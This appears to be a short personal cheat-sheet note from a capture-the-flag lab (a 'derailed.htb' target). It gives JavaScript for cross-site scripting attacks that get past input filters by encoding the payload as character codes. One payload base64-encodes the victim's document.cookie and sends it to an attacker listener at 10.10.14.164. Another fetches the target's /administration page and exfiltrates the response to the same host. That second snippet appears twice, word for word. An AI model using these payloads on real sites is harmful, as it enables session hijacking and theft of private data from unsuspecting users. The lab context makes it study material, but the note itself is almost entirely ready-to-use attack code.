
XSS cookie stealing using charcode bypass:
---
#xss #charcode #bypass #cookies 
```js
const attacker = `http://10.10.14.164/cb`;
const xssString = `var attacker = "${attacker}";
fetch(attacker + "?cb=" + encodeURI(btoa(document.cookie)));`
const payload = Array.from(xssString.split(''), ch => ch.charCodeAt(0)).join(',');
console.log(payload);
```
Reverse the payload:
---
```js
console.log(String.fromCharCode(...(payload.split(','))));
```

```js
var url = "http://derailed.htb:3000/administration";
var attacker = "http://10.10.14.164/cb";
const xssString = `
var xhr  = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        fetch("${attacker}" + "?" + encodeURI(btoa(xhr.responseText)))
    }
}
xhr.open('GET', "${url}", true);
xhr.send(null);`
const payload = Array.from(xssString.split(''), ch => ch.charCodeAt(0)).join(',');
```

```js
var url = "http://derailed.htb:3000/administration";
var attacker = "http://10.10.14.164/cb";
const xssString = `
var xhr  = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        fetch("${attacker}" + "?" + encodeURI(btoa(xhr.responseText)))
    }
}
xhr.open('GET', "${url}", true);
xhr.send(null);`
const payload = Array.from(xssString.split(''), ch => ch.charCodeAt(0)).join(',');
```
